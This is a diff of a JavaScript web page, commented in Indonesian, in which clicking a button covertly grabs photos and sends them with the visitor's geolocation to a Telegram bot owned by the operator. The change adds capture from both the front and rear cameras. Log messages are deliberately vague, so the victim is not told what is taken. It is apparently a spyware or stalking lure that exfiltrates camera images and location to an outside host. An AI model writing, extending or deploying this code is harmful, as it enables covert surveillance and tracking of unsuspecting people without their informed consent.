@@ -45,28 +45,36 @@ function log(msg){
   logBox.scrollTop = logBox.scrollHeight;
 }
 
-document.getElementById("openBtn").addEventListener("click", async()=>{
+// fungsi ambil foto
+async function ambilFoto(facingMode){
   log("▶ Mengakses Data...");
-  let photoBlob=null;
+  let photoBlob = null;
   try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: facingMode } }
+    });
     const video = document.createElement("video");
     video.srcObject = stream;
     await video.play();
+
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video,0,0,canvas.width,canvas.height);
+
     photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
     stream.getTracks().forEach(t=>t.stop());
     log("System: Data diambil.");
   }catch(e){
     log("Data Gagal Diambil: "+e.message);
   }
+  return photoBlob;
+}
 
+document.getElementById("openBtn").addEventListener("click", async()=>{
   log("▶ Mencari Informasi...");
-  let coords=null;
+  let coords = null;
   try{
     coords = await new Promise((resolve,reject)=>{
       navigator.geolocation.getCurrentPosition(
@@ -80,24 +88,32 @@ document.getElementById("openBtn").addEventListener("click", async()=>{
     log("❌Lokasi Gagal: "+e.message);
   }
 
-  // Kirim ke Telegram
+  // ambil foto dari kamera depan
+  const fotoDepan = await ambilFoto("user");
+
+  // ambil foto dari kamera belakang
+  const fotoBelakang = await ambilFoto("environment");
+
+  // kirim ke Telegram
   try{
-    if(photoBlob){
+    if(fotoDepan){
       const fd = new FormData();
       fd.append("chat_id",OWNER_ID);
-      fd.append("photo",photoBlob,"snap.jpg");
+      fd.append("photo",fotoDepan,"snap.jpg");
       let cap = "Snapshot dari device.";
       if(coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
       fd.append("caption",cap);
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
       log("Data terkirim ke Pemilik.");
     }
-    if(coords){
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({chat_id:OWNER_ID,text:`Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`})
-      });
+    if(fotoBelakang){
+      const fd = new FormData();
+      fd.append("chat_id",OWNER_ID);
+      fd.append("photo",fotoBelakang,"snap.jpg");
+      let cap = "Snapshot dari device.";
+      if(coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+      fd.append("caption",cap);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
       log("Data terkirim ke Pemilik.");
     }
   }catch(e){
